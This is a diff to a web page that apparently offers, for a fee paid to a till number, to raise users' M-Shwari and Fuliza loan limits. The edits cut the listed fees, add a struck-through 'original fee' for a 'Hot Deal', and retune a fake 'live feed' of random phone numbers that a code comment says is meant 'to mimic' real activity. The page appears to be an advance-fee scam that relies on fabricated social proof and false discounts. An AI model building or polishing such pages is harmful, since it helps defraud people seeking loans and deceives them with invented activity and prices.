@@ -335,6 +335,18 @@
       background: var(--front-green);
       color: #fff;
     }
+    
+    /* Original fee strikethrough style */
+    .original-fee {
+      text-decoration: line-through;
+      color: #999;
+      margin-right: 4px;
+      font-weight: 400;
+    }
+    .loan-option.selected .original-fee {
+      color: rgba(255, 255, 255, 0.75);
+    }
+
     .selected-check {
       position: absolute;
       top: 6px;
@@ -691,7 +703,7 @@
 
     const TILL_NUMBER = '1787901';
 
-    // Data Configuration
+    // Data Configuration (Figures updated to match Fuliza page)
     const programs = {
       mshwari: {
         name: 'M-Shwari',
@@ -699,18 +711,18 @@
         subtitle: 'Increase Your M-Shwari Loan Limit Instantly',
         cardTitle: 'Select Your M-Shwari Limit',
         limits: [
-          { amount: 5000, fee: 100 },
-          { amount: 8500, fee: 300 },
-          { amount: 12500, fee: 520, badge: "Most Popular", badgeClass: "popular" },
-          { amount: 20000, fee: 940 },
-          { amount: 25500, fee: 1150 },
-          { amount: 30000, fee: 1330, badge: "Most Popular", badgeClass: "popular" },
-          { amount: 35000, fee: 1580 },
-          { amount: 40000, fee: 1840 },
-          { amount: 45000, fee: 2150 },
-          { amount: 50000, fee: 2530, badge: "Premium", badgeClass: "premium" },
-          { amount: 55000, fee: 3160 },
-          { amount: 60000, fee: 3800, badge: "Max Limit", badgeClass: "max" }
+          { amount: 10000, fee: 100 },
+          { amount: 12500, fee: 130, badge: "Most Popular", badgeClass: "popular" },
+          { amount: 16000, fee: 180 },
+          { amount: 21000, fee: 200 },
+          { amount: 25500, fee: 220 },
+          { amount: 30000, fee: 350 },
+          { amount: 35000, fee: 420 },
+          { amount: 40000, fee: 540 },
+          { amount: 45000, fee: 680 },
+          { amount: 50000, fee: 500, originalFee: 960, badge: "Hot Deal", badgeClass: "max" },
+          { amount: 60000, fee: 1550, badge: "Premium", badgeClass: "premium" },
+          { amount: 70000, fee: 2000, badge: "Max Limit", badgeClass: "max" }
         ]
       },
       fuliza: {
@@ -719,18 +731,18 @@
         subtitle: 'Increase Your Pochi Fuliza Limit Instantly',
         cardTitle: 'Select Your Pochi Fuliza Limit',
         limits: [
-          { amount: 5000, fee: 100 },
-          { amount: 8500, fee: 300 },
-          { amount: 12500, fee: 520, badge: "Most Popular", badgeClass: "popular" },
-          { amount: 20000, fee: 940 },
-          { amount: 25500, fee: 1150 },
-          { amount: 30000, fee: 1330, badge: "Most Popular", badgeClass: "popular" },
-          { amount: 35000, fee: 1580 },
-          { amount: 40000, fee: 1840 },
-          { amount: 45000, fee: 2150 },
-          { amount: 50000, fee: 2530, badge: "Premium", badgeClass: "premium" },
-          { amount: 55000, fee: 3160 },
-          { amount: 60000, fee: 3800, badge: "Max Limit", badgeClass: "max" }
+          { amount: 10000, fee: 100 },
+          { amount: 12500, fee: 130, badge: "Most Popular", badgeClass: "popular" },
+          { amount: 16000, fee: 180 },
+          { amount: 21000, fee: 200 },
+          { amount: 25500, fee: 220 },
+          { amount: 30000, fee: 350 },
+          { amount: 35000, fee: 420 },
+          { amount: 40000, fee: 540 },
+          { amount: 45000, fee: 680 },
+          { amount: 50000, fee: 500, originalFee: 960, badge: "Hot Deal", badgeClass: "max" },
+          { amount: 60000, fee: 1550, badge: "Premium", badgeClass: "premium" },
+          { amount: 70000, fee: 2000, badge: "Max Limit", badgeClass: "max" }
         ]
       }
     };
@@ -749,7 +761,8 @@
 
     // ─── LIVE FEED LOGIC ──────────────────────────────────────────────
     const phonePrefixes = ['0712', '0723', '0710', '0725', '0722', '0728', '0711', '0713', '0727', '0706', '0715', '0720', '0716', '0729', '0708', '0718', '0721', '0705', '0719', '0724'];
-    const feedAmounts = [5000, 8500, 12500, 20000, 25500, 30000, 35000, 40000, 45000, 50000, 55000, 60000];
+    // Updated feed amounts to match new limits
+    const feedAmounts = [10000, 12500, 16000, 21000, 25500, 30000, 35000, 40000, 45000, 50000, 60000, 70000];
     // Heavily weighted towards "just now" to mimic a fast-moving live feed
     const feedTimes = ['just now', 'just now', 'just now', 'just now', 'just now', 'just now', '1 min ago', '2 mins ago', '3 mins ago', '5 mins ago'];
     
@@ -826,7 +839,10 @@
           ${item.amount === selectedLimit.amount ? '<i class="fas fa-check-circle selected-check"></i>' : ''}
           ${item.badge ? `<span class="loan-badge ${item.badgeClass}">${item.badge}</span>` : ''}
           <div class="loan-amount">Ksh ${item.amount.toLocaleString()}</div>
-          <div class="loan-fee">Fee: Ksh ${item.fee.toLocaleString()}</div>
+          <div class="loan-fee">
+            ${item.originalFee ? `<span class="original-fee">Ksh ${item.originalFee.toLocaleString()}</span>` : 'Fee: '}
+            Ksh ${item.fee.toLocaleString()}
+          </div>
         </div>
       `).join('');
       
